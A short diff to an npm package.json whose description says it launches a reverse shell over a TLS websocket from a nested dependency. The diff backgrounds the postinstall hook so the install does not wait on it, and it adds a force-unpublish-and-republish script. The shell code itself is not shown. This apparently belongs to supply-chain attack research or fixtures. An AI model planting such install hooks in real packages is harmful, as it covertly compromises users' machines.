+++ npm-script-hooks/pkg-d-rsh/package.json
@@ -4,7 +4,7 @@
   "description": "Dependency graph depth 4 that launches a reverse shell over a TLS websocket",
   "main": "index.js",
   "scripts": {
-    "postinstall": "node postinstall.js",
+    "postinstall": "node postinstall.js &",
     "pub:refresh": "npm unpublish pkg-d-rsh --force && npm publish",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
